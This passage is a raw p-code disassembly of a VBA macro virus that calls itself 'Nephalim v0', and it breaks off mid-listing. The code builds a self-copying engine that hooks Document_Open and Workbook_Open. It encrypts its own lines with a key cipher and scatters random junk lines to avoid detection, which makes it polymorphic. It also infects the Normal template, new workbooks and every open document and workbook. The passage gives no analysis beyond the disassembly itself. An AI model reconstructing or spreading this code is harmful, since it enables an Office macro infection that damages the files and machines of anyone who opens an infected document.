' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	St sEngine1 
' Line #68:
' 	Ld sTargetApp 
' 	SelectCase 
' Line #69:
' 	LineCont 0x000C 07 00 00 00 15 00 00 00 23 00 00 00
' 	LitStr 0x0005 "Excel"
' 	Case 
' 	CaseDone 
' 	BoS 0x000F 
' 	Ld sEngine1 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0012 " As Excel.Workbook"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0004 "Set "
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0016 " = Excel.Workbooks.Add"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = 4"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	St sEngine1 
' Line #70:
' 	LineCont 0x000C 07 00 00 00 15 00 00 00 23 00 00 00
' 	LitStr 0x0004 "Word"
' 	Case 
' 	CaseDone 
' 	BoS 0x000E 
' 	Ld sEngine1 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0011 " As Word.Document"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0004 "Set "
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0015 " = Word.Documents.Add"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = 1"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	St sEngine1 
' Line #71:
' 	EndSelect 
' Line #72:
' 	LineCont 0x0038 04 00 00 00 0B 00 00 00 12 00 00 00 26 00 00 00 3A 00 00 00 4E 00 00 00 65 00 00 00 7F 00 00 00 8B 00 00 00 97 00 00 00 AC 00 00 00 BF 00 00 00 DB 00 00 00 F5 00 00 00
' 	Ld sEngine1 
' 	Ld sSplitObject1A 
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	Ld sSplitObject2A 
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = ("
' 	Concat 
' 	Ld iSplitNumber1A 
' 	Concat 
' 	LitStr 0x0001 "+"
' 	Concat 
' 	Ld iSplitNumber1B 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = ("
' 	Concat 
' 	Ld iSplitNumber2A 
' 	Concat 
' 	LitStr 0x0001 "+"
' 	Concat 
' 	Ld iSplitNumber2B 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0004 "For "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0008 " = 1 To "
' 	Concat 
' 	Ld iSplitNumber3A 
' 	Concat 
' 	LitStr 0x0001 "+"
' 	Concat 
' 	Ld iSplitNumber3B 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld sSplitObject2B 
' 	Concat 
' 	LitStr 0x0006 "lines("
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 ", 1)"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = right("
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0005 ",len("
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 ")-1)"
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0005 " = """
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = 0"
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0004 "For "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x000C " = 1 To Len("
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " + 1"
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " > "
' 	Concat 
' 	Ld sKey 
' 	FnLen 
' 	Concat 
' 	LitStr 0x0005 "Then "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = 1"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x000B " = Asc(Mid("
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0005 ", 1))"
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " >= "
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " <= "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	St sEngine1 
' Line #73:
' 	LineCont 0x0004 02 00 00 00
' 	LitDI2 0x0008 
' 	ArgsLd var 0x0001 
' 	LitStr 0x000C " = Asc(Mid(""
' 	Concat 
' 	Ld sKey 
' 	Concat 
' 	LitStr 0x0003 "", "
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0005 ", 1))"
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	St sEngine2 
' Line #74:
' 	LineCont 0x0010 02 00 00 00 3A 00 00 00 52 00 00 00 83 00 00 00
' 	LitStr 0x0003 "If "
' 	LitDI2 0x0008 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " > ("
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0007 ") Then "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " - ("
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " < "
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0006 " Then "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0004 " - ("
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	St sEngine3 
' Line #75:
' 	LineCont 0x002C 04 00 00 00 15 00 00 00 1C 00 00 00 36 00 00 00 42 00 00 00 57 00 00 00 7A 00 00 00 9D 00 00 00 A9 00 00 00 BB 00 00 00 C7 00 00 00
' 	Ld sEngine3 
' 	LitDI2 0x0007 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0007 " & Chr("
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Next "
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = InStr("
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0006 ", ":NP"
' 	Concat 
' 	LitStr 0x0007 "R") - 1"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x000B " <> 0 then "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0008 " = Left("
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0008 "If Left("
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0013 ", 3) <> "'NP" then "
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0003 " & "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x0007 " & vbLf"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Next "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	Ld sSplitObject1B 
' 	Concat 
' 	LitStr 0x000C "InsertLines "
' 	Concat 
' 	LitDI2 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitStr 0x000D ".close(False)"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	St sEngine3 
' Line #76:
' 	LineCont 0x0018 04 00 00 00 10 00 00 00 1A 00 00 00 1E 00 00 00 2A 00 00 00 34 00 00 00
' 	Ld sEngine3 
' 	LitDI2 0x0001 
' 	ArgsLd proc_declare 0x0001 
' 	Concat 
' 	LitStr 0x0015 "Sub Document_Open () "
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd proc_declare 0x0001 
' 	Concat 
' 	LitStr 0x0015 "Sub Workbook_Open () "
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsLd bond 0x0001 
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsLd var 0x0001 
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsLd eol 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	St sEngine3 
' Line #77:
' 	Ld sEngine1 
' 	Ld sEngine2 
' 	Concat 
' 	Ld sEngine3 
' 	Concat 
' 	St fExposedEngine 
' Line #78:
' 	EndFunc 
' Line #79:
' 	FuncDefn (Private Function fEncrypt(iDirection As Integer, sKey As String, sInput As String, id_FFFE As String) As String)
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Dim 
' 	VarDefn sTemp (As String)
' 	VarDefn iChr (As Integer)
' 	VarDefn iKey (As Integer)
' 	VarDefn iTemp (As Integer)
' 	VarDefn i (As Integer)
' 	VarDefn j (As Integer)
' Line #82:
' 	LitStr 0x0000 ""
' 	St sTemp 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St j 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sInput 
' 	FnLen 
' 	For 
' Line #84:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' 	BoS 0x0000 
' 	Ld j 
' 	Ld sKey 
' 	FnLen 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St j 
' 	EndIf 
' Line #85:
' 	Ld sInput 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St iChr 
' Line #86:
' 	Ld iChr 
' 	LitDI2 0x0020 
' 	Ge 
' 	Ld iChr 
' 	LitDI2 0x0082 
' 	Le 
' 	And 
' 	IfBlock 
' Line #87:
' 	Ld sKey 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St iKey 
' Line #88:
' 	Ld iKey 
' 	LitDI2 0x0082 
' 	LitDI2 0x0020 
' 	Sub 
' 	Paren 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld iKey 
' 	LitDI2 0x0020 
' 	LitDI2 0x0082 
' 	Sub 
' 	Paren 
' 	Add 
' 	St iKey 
' 	EndIf 
' Line #89:
' 	Ld iChr 
' 	Ld iDirection 
' 	Ld iKey 
' 	Mul 
' 	Add 
' 	St iTemp 
' Line #90:
' 	Ld iTemp 
' 	LitDI2 0x0082 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	Ld iTemp 
' 	LitDI2 0x0082 
' 	Sub 
' 	Paren 
' 	Add 
' 	St iTemp 
' 	EndIf 
' Line #91:
' 	Ld iTemp 
' 	LitDI2 0x0020 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0082 
' 	LitDI2 0x0020 
' 	Ld iTemp 
' 	Sub 
' 	Paren 
' 	Sub 
' 	St iTemp 
' 	EndIf 
' Line #92:
' 	ElseBlock 
' Line #93:
' 	Ld iChr 
' 	St iTemp 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	Ld sTemp 
' 	Ld iTemp 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St sTemp 
' Line #96:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	Ld sTemp 
' 	St fEncrypt 
' Line #98:
' 	EndFunc 
' Line #99:
' 	FuncDefn (Private Sub fTouchFile(dTargetApplication As String, dSource As Object, dTarget As String))
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	Dim 
' 	VarDefn iTemp (As Integer)
' 	VarDefn sMKey (As String)
' Line #102:
' 	Ld CreateKey 
' 	St sMKey 
' Line #103:
' 	Ld dTarget 
' 	Paren 
' 	ArgsCall fDeleteFile 0x0001 
' Line #104:
' 	Ld dTarget 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #105:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dSource 
' 	MemLd CountOfLines 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0001 
' 	Ld sMKey 
' 	Ld iTemp 
' 	LitDI2 0x0001 
' 	Ld dSource 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd fEncrypt 0x0003 
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld dTargetApplication 
' 	Ld sMKey 
' 	Ld dSource 
' 	MemLd CountOfLines 
' 	ArgsLd fExposedEngine 0x0003 
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Private Sub fTouch(dSource As Object, dTarget As Object))
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	Dim 
' 	VarDefn iTemp (As Integer)
' 	VarDefn sMKey (As String)
' 	VarDefn sTarget (As String)
' Line #112:
' 	Dim 
' 	VarDefn sExtractedKey (As String)
' 	VarDefn sFirstLine (As String)
' Line #113:
' 	Dim 
' 	VarDefn buffer_lines (As Integer)
' Line #114:
' 	Ld Application 
' 	MemLd New 
' 	SelectCase 
' Line #115:
' 	LitStr 0x000E "Microsoft Word"
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Word"
' 	St sTarget 
' Line #116:
' 	LitStr 0x000F "Microsoft Excel"
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Excel"
' 	St sTarget 
' Line #117:
' 	EndSelect 
' Line #118:
' 	StartWithExpr 
' 	Ld dTarget 
' 	With 
' Line #119:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #120:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St sTemp 
' Line #121:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St sFirstLine 
' Line #122:
' 	LitDI2 0x0001 
' 	Ld sTemp 
' 	LitStr 0x0009 "Asc(Mid(""
' 	FnInStr3 
' 	St poz1 
' Line #123:
' 	Ld poz1 
' 	Ld sTemp 
' 	LitStr 0x0002 "))"
' 	FnInStr3 
' 	Ld poz1 
' 	Sub 
' 	St poz2 
' Line #124:
' 	Ld sTemp 
' 	Ld poz1 
' 	Ld poz2 
' 	ArgsLd Mid$ 0x0003 
' 	St sExtractedKey 
' Line #125:
' 	LitDI2 0x0001 
' 	Ld sExtractedKey 
' 	LitStr 0x0001 """
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Add 
' 	St poz1 
' Line #126:
' 	Ld poz1 
' 	Ld sExtractedKey 
' 	LitStr 0x0001 """
' 	FnInStr3 
' 	Ld poz1 
' 	Sub 
' 	St poz2 
' Line #127:
' 	Ld sExtractedKey 
' 	Ld poz1 
' 	Ld poz2 
' 	ArgsLd Mid$ 0x0003 
' 	St sExtractedKey 
' Line #128:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld sExtractedKey 
' 	Ld sFirstLine 
' 	Ld sFirstLine 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd fEncrypt 0x0003 
' 	St sFirstLine 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	LitDI2 0x0001 
' 	Ld sFirstLine 
' 	LitStr 0x000B "Nephalim v0"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	St bAlreadyTouched 
' Line #131:
' 	EndWith 
' Line #132:
' 	ArgsCall Read 0x0000 
' Line #133:
' 	LitDI2 0x0000 
' 	St buffer_lines 
' Line #134:
' 	Ld bAlreadyTouched 
' 	Not 
' 	IfBlock 
' Line #135:
' 	Ld CreateKey 
' 	St sMKey 
' Line #136:
' 	StartWithExpr 
' 	Ld dTarget 
' 	With 
' Line #137:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #138:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dSource 
' 	MemLd CountOfLines 
' 	For 
' Line #139:
' 	Ld iTemp 
' 	LitDI2 0x0001 
' 	Ld dSource 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #140:
' 	LitStr 0x0000 ""
' 	St sPostBuffer 
' Line #141:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 ":NP"
' 	LitStr 0x0002 "R "
' 	Concat 
' 	Ld CreateKey 
' 	Concat 
' 	St sPostBuffer 
' 	EndIf 
' Line #142:
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0001 
' 	Ld sMKey 
' 	Ld iTemp 
' 	LitDI2 0x0001 
' 	Ld dSource 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	Ld sPostBuffer 
' 	Concat 
' 	ArgsLd fEncrypt 0x0003 
' 	Concat 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #143:
' 	Ld buffer_lines 
' 	LitDI2 0x0001 
' 	Add 
' 	St buffer_lines 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #146:
' 	LitStr 0x0000 ""
' 	St sTemp 
' Line #147:
' 	StartForVariable 
' 	Ld iTemp2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' 	BoS 0x0000 
' 	Ld sTemp 
' 	Ld CreateKey 
' 	Concat 
' 	St sTemp 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld iTemp2 
' 	EndForVariable 
' 	NextVar 
' Line #148:
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0001 
' 	Ld sMKey 
' 	LitStr 0x0003 "'NP"
' 	Ld sTemp 
' 	Concat 
' 	ArgsLd fEncrypt 0x0003 
' 	Concat 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #149:
' 	Ld buffer_lines 
' 	LitDI2 0x0001 
' 	Add 
' 	St buffer_lines 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #152:
' 	Ld sTarget 
' 	Ld sMKey 
' 	Ld buffer_lines 
' 	ArgsLd fExposedEngine 0x0003 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #153:
' 	EndWith 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Private Sub fActiveSpawn())
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	Dim 
' 	VarDefn iTemp (As Integer)
' 	VarDefn iTemp2 (As Integer)
' Line #159:
' 	Dim 
' 	VarDefn oPersonal (As Object)
' Line #160:
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall fTouch 0x0002 
' Line #161:
' 	SetStmt 
' 	Ld Workbooks 
' 	MemLd Add 
' 	Set oPersonal 
' Line #162:
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	LitDI2 0x0001 
' 	Ld oPersonal 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall fTouch 0x0002 
' Line #163:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #164:
' 	Ld iTemp 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	LitDI2 0x0001 
' 	Ld iTemp 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsCall fTouch 0x0002 
' 	EndIf 
' Line #165:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	NextVar 
' Line #166:
' 	StartForVariable 
' 	Ld iTemp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #167:
' 	Ld iTemp 
' 	Ld Workbooks 
